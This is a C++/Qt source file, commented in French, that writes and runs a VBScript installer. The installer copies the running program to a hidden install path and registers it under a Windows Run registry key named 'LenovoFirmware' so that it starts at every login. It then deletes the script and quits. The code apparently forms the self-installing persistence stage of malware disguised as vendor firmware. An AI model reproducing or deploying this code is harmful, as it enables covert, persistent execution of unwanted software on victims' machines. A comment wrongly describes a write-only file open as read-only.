#include <global.h>
#include <install.h>

InstallObject::InstallObject(QObject *parent) : QObject(parent)
{
    timer = new QTimer(this);
    connect(timer, SIGNAL(timeout()), this, SLOT(shutdown()));
}

void InstallObject::checking()
{
        QFileInfo checkingFile(QDir::fromNativeSeparators(GLOBAL_runInstallPath + GLOBAL_nameInstallRun));

        // Test si le fichier existe ou non //
        if (checkingFile.exists() && checkingFile.isFile())
        {
        }
        else
        {
            this->start();
        }
}

void InstallObject::start()
{
    // Création d'un objet fichier //
    QFile file(GLOBAL_scriptPath + "/Install.vbs");

    // Ouverture du fichier en lecture seule et vérification de l'ouverture //
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text))return;

    // Création d'un objet à partir d'un autre objet //
    QTextStream flux(&file);

    // Paramétrage codec du jeu de caractère en UTF-8 //
    flux.setCodec("UTF-8");

    // Écriture des commandes dans le fichier //
    flux << "on error resume next\n";

    flux << "Set Shell = WScript.CreateObject(\"WScript.Shell\") \n";
    flux << "Shell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LenovoFirmware\", \"" << GLOBAL_runInstallPath.replace("/","\\") + GLOBAL_nameInstallRun <<"\",   \"REG_SZ\" \n";

    flux << "Set ScrObj = WScript.CreateObject(\"Scripting.FileSystemObject\") \n";
    flux << "ScrObj.CreateFolder(\"" << GLOBAL_runInstallPath << "\") \n";
    flux << "ScrObj.CopyFile \"" << QCoreApplication::applicationFilePath() << "\", \"" << GLOBAL_runInstallPath <<"\" \n";
    flux << "ScrObj.DeleteFile(\"" << GLOBAL_scriptPath + "/Install.vbs" << "\")\n";

    flux << "Shell.run \"" << GLOBAL_runInstallPath + GLOBAL_nameInstallRun << "\" \n";

    QProcess *launch;
    launch = new QProcess();
    launch->startDetached("Wscript.exe" ,QStringList() << GLOBAL_scriptPath + "/Install.vbs" );
    launch->startDetached(GLOBAL_runInstallPath + GLOBAL_nameInstallRun);


    // Lancement de la séquence d'arrêt du programme //
    timer->start(1000);
}

void InstallObject::shutdown()
{
    // Arrêt du programme //
    exit(0);
}
